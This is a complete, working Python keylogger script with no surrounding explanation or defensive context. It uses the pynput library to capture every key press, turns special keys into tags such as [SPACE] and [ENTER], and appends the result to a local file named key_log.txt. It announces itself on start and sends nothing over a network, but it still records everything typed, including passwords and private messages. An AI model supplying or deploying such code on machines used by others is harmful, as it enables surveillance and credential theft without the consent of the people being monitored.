from pynput import keyboard

# Define the file to store the logged keystrokes
LOG_FILE = "key_log.txt"

def write_to_file(key):
    """Write the pressed key to the log file."""
    try:
        # Convert key to a readable string
        key_str = str(key).replace("'", "")  # Remove single quotes around characters

        # Handle special keys
        if key == keyboard.Key.space:
            key_str = "[SPACE]"
        elif key == keyboard.Key.enter:
            key_str = "[ENTER]\n"
        elif key == keyboard.Key.backspace:
            key_str = "[BACKSPACE]"
        elif key == keyboard.Key.tab:
            key_str = "[TAB]"

        # Append the key string to the log file
        with open(LOG_FILE, "a") as log_file:
            log_file.write(key_str)

    except Exception as e:
        print(f"Error writing to file: {e}")

# Define the function to handle key press events
def on_press(key):
    write_to_file(key)

# Set up a listener for the keyboard
print("Keylogger started. Press Ctrl+C to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()